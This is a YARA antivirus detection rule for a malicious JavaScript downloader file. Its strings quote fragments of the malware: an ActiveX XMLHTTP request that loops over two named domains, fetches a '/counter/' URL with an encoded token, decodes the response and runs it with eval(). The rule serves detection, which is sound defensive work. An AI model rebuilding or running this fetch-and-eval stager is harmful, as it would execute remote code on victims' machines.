rule sig_20170206_5601e3f1b386552d309c30661ae3ae30 {
  meta:
    description = "datamaliciousorder - file 20170206_5601e3f1b386552d309c30661ae3ae30.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "9c4ccc867541ad9babae466c570b54de6abfd8c3cc8df5041ac685d9a2319391"

  strings:
    $s1 = "var z1 = \"Msxml2.XMLHTTP\"; var m = \"zXMd7WmsfCYR4Elijowfndm9BW_vR03h-PFz1zBrfdS7hHp4vENptm70HP17kBhVEZlOn-iXcvg_0\"; var x = " ascii
    $s2 = "Array(\"singoutloudkaraoke.com\",\"corporationregistry-online-form.com\"); var z4 = \"a\"; for (var i=0; i<x.length; i++) { var " ascii
    $s3 = "w ActiveXObject(z1); try { e.open(\"GET\", \"http://\"+x[i]+\"/counter/?\"+m, false); e.send(); if (e.status == 200) { var z3 = " ascii
    $s4 = "onseText; var z3 = z3.split(m); var z3 = z3.join(z4); eval(z3); break; }; } catch(e) { }; };" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    all of them
}